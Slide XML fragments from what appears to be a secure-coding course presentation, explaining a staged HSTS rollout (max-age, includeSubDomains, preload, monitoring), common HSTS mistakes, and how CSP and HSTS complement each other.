            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Then months: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>max-age=15552000</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (~180 days)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Eventually a year+: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>max-age=31536000</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="61393019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32F2-6218-16DA-87FA-029DA7F53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B53EA-E229-5A5C-486F-4C0D458B9B76}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>HTTPS rollout 04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{89D1424A-B4E5-D690-3441-3F0C8C7ECC3E}"/>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b="1" dirty="0"/>
              <a:t>Step 4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>– Level</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>  Up:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Once you are confident in your configurations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial,Sans-Serif" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Add </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>includeSubDomains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial,Sans-Serif" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t>Add </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>preload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t> and apply for the preload list</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="411863884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D2CD9-6D8A-1187-9F19-05475A2BF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3F9CC-6634-B6A8-8753-056735D144FA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>HTTPS rollout 05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E2CF33C4-8D15-8822-9C38-7D415CA8EB07}"/>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b="1" dirty="0"/>
              <a:t>Step 4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> – Monitoring</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Use:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Browser </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>devtools</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (Network tab → check response headers).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Online scanners (e.g., SSL Labs, security header checkers) to confirm HSTS is present and correct.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="131295688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F115B-7C6C-37FC-6DB3-89FCE34D4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9EE66-4246-D784-FBC0-90E7980D7925}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>HTTPS common mistakes 01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{502FA4B0-793D-422C-0334-820FC2B3D2DA}"/>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dirty="0"/>
              <a:t>Locking yourself out with bad TLS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Once HSTS is enforced with a long </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>max-age</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>If your cert expires or you misconfigure TLS, users’ browsers </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>will not let them bypass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> the error.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Your site effectively becomes unreachable until you fix TLS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17983964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039AE-A6E6-570E-24E2-52503DAAD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4A11B-C948-361D-078C-3ED1967C6011}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>HTTPS common mistakes 02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6DFF59FE-197B-E6F8-6FC1-A9634DEFD076}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="9263624" cy="4391667"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Enabling </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>includeSubDomains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> too early</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>If any subdomain:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Doesn’t support HTTPS, or</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Uses a different certificate or legacy system that can’t do TLS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>properly,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>includeSubDomains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> may break those services for HSTS-aware browsers.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="99390168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D78C6-6BB3-4E89-F6D4-556E645DF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202CA-7064-1746-0688-8D58BE6A6BE7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>HTTPS common mistakes 03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E53439C5-CB9B-01CC-2AA6-DC401B0A6BD2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="9263624" cy="4391667"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Using HSTS without full HTTP → HTTPS redirects</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>HSTS only protects </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>clients that have already seen the header</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>New clients still need a good redirect path from HTTP → HTTPS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Don’t skip the redirects; HSTS complements them</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="324493251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4DD1B-B554-89DE-47A2-99813D484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52B6-1751-99AD-9B4F-B7FE6DB38359}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Key Takeaways</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{81F288C6-F0B4-7B19-A335-187A1C15BF34}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="9263624" cy="4391667"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>CSP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>p</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>rotects the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>content inside</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> HTTP responses</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-171450"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Restricts where scripts, styles, and resources can come from.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-171450"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Mitigates attacks if an attacker finds some injection point.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>HSTS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Ensures the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>transport layer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is secure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-171450"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Prevents SSL stripping, protocol downgrade</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-171450"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Prevents MITM attacks, cookie theft, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" err="1"/>
              <a:t>etc</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Both are defense in depth measures and should be implemented alongside TLS, session security, input </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="148944106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5213-090D-7F64-64CE-007DE613C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DFF5E-611A-51DE-1B89-34E25079104A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="2136906"/>
            <a:ext cx="10515600" cy="2591359"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Session 2:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Security Refresher, Secure Application Architecture, &amp; HTTP Foundations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2910429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193</Slides>
  <Notes>176</Notes>
  <HiddenSlides>0</HiddenSlides>
  <MMClips>0</MMClips>
  <ScaleCrop>false</ScaleCrop>
  <HeadingPairs>
    <vt:vector size="4" baseType="variant">
      <vt:variant>
        <vt:lpstr>Theme</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpstr>Slide Titles</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>193</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="194" baseType="lpstr">
      <vt:lpstr>office theme</vt:lpstr>
      <vt:lpstr>Secure Coding</vt:lpstr>
      <vt:lpstr>Learning Outcomes</vt:lpstr>
